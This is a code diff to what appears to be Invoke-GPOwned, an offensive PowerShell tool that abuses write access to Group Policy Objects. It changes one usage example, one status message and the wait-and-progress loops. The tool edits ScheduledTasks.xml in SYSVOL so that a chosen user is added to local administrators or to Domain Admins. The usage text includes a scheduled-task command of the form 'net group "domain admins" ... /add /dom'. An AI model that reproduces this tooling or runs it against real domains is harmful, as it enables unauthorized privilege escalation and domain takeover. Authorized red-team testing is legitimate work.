@@ -74,7 +74,7 @@ Invoke-GPOwned -GPOGUID {387547AA-B67F-4D7B-A524-AE01E56751DD} -LoadDLL .\Micros
 Invoke-GPOwned -GPOGUID {387547AA-B67F-4D7B-A524-AE01E56751DD} -LoadDLL .\Microsoft.ActiveDirectory.Management.dll -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -User UserToElevate -Computer pc01.noteasy.local -Local
 
 - GPO Linked to a workstation with a DA Session:
-Invoke-GPOwned -GPOGUID "{D552AC5B-CE07-4859-9B8D-1B6A6BE1ACDA}" -LoadDLL .\Microsoft.ActiveDirectory.Management.dll -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -c "pc-01.noteasy.local" -Author "DAUser" -SecondTaskXMLPath ".\wsadd.xml" -SecondXMLCMD '/r net group "domain admins" UserToElevate /add /dom'
+Invoke-GPOwned -GPOGUID "{D552AC5B-CE07-4859-9B8D-1B6A6BE1ACDA}" -LoadDLL .\Microsoft.ActiveDirectory.Management.dll -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -Computer "pc-01.noteasy.local" -Author "DAUser" -SecondTaskXMLPath ".\wsadd.xml" -SecondXMLCMD '/r net group "domain admins" UserToElevate /add /dom'
 
 Parameters:
 -GPOGUID/-guid: Group Policy GUID
@@ -300,7 +300,6 @@ if(!($LoadDLL)){
                     Set-Content -Encoding $encoding $xmlfile -Force
         $green+" ScheduledTasks file modified to add $User to local administrators group on $Computer!"
     } else {
-
         if($SecondTaskXMLPath){
             $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
@@ -320,7 +319,7 @@ if(!($LoadDLL)){
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
         $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","/r \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\add.bat"} |
                     Set-Content -Encoding $encoding $xmlfile -Force
-        $green+" ScheduledTasks file modified with the supplied custom command!."
+        $green+" ScheduledTasks file modified to run the add.bat file!."
         }
         if($PowerShell){
             if(($PowerShell.StartSwith("-c "))){
@@ -421,39 +420,38 @@ if(!($LoadDLL)){
     }
     # A bad loading screen counting up to 300(5 minute update interval on DCs) #
     if($DA){
-        for ($x = 1; $x -le 300; $x++ ){
+        for ($x = 1; $x -le 300; $x+=5 ){
             $PercentCompleted = ($x/300*100)
             Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-            Start-Sleep -Seconds 1
+            Start-Sleep -Seconds 10
             if ((Get-ADGroupMember "Domain Admins" | findstr $User) -ne $null) {
                 break
             }
         }
-        $timepassed = 0
-        while((Get-ADGroupMember "Domain Admins" | findstr $User) -eq $null){
-            Start-Sleep 1
-            }
-        Write-Output "`n`n"
         $green+" User added to the domain admins group!"
     } elseif($Local){
-         for ($x = 1; $x -le 300; $x++ ){
+         for ($x = 1; $x -le 300; $x+=10 ){
             $PercentCompleted = ($x/300*100)
             Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-            Start-Sleep -Seconds 1
+            Start-Sleep -Seconds 10
             if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | select Name -ExpandProperty Name | findstr $User) -ne $null) {
                 break
             }
-        }
-        $timepassed = 0
-        while((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | select Name -ExpandProperty Name | findstr $User) -eq $null){
-            Start-Sleep 1
-            }
         $green+" User added to the local admins group!"
-     }elseif($CMD -or $PowerShell){
-        for ($x = 1; $x -le 300; $x++){
+    }elseif($CMD -or $PowerShell){
+        for ($x = 1; $x -le 300; $x+=10){
             $PercentCompleted = ($x/300*100)
             Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-            Start-Sleep -Seconds 1
+            Start-Sleep -Seconds 10
+        }
+    }elseif($SecondTaskXMLPath -and $User){
+        for ($x = 1; $x -le 86400; $x+=60){
+            $PercentCompleted = ($x/86400*100)
+            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+            Start-Sleep -Seconds 60
+            if ((Get-ADGroupMember "Domain Admins" | findstr $User) -ne $null) {
+                break
+            }                
         }
     }
     $gray+" Reverting extensions back to what they were"
